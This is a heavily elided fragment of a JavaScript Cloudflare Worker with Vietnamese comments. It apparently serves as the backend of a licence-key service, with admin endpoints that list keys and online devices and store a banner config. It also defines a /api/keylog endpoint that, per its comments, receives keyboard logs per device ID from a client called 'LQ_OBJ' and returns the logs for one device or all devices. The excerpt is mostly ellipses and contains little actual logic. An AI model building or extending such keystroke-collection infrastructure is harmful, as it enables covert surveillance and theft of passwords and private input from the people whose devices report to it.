...
export default {
  async fetch(request, env) {
    ...
    if (url.pathname === '/api/admin/list') {
      ...
      const onlineListed =
        await env.KEYS_KV.list({ prefix: 'online:' });
      ...
      const listed =
        await env.KEYS_KV.list({ prefix: 'key:' });
    ...
    if (
      url.pathname === '/api/admin/rename-device' &&
      request.method === 'POST'
    ) {
      const adminToken =
        request.headers.get('X-Admin-Token');
    ...
    // Public endpoint: source LQ_OBJ gọi sau khi validate key
    ...
    if (
      ...
      if (body.banner_config) {
        await env.KEYS_KV.put(
          'global:banner_config',
          JSON.stringify(body.banner_config)
        );
      }
    ...
    // ── POST /api/keylog ───────────────────────────────────────────────────
    // Source LQ_OBJ gửi log bàn phím theo device ID
    if (
    ...
    // Lấy log bàn phím của 1 device hoặc tất cả
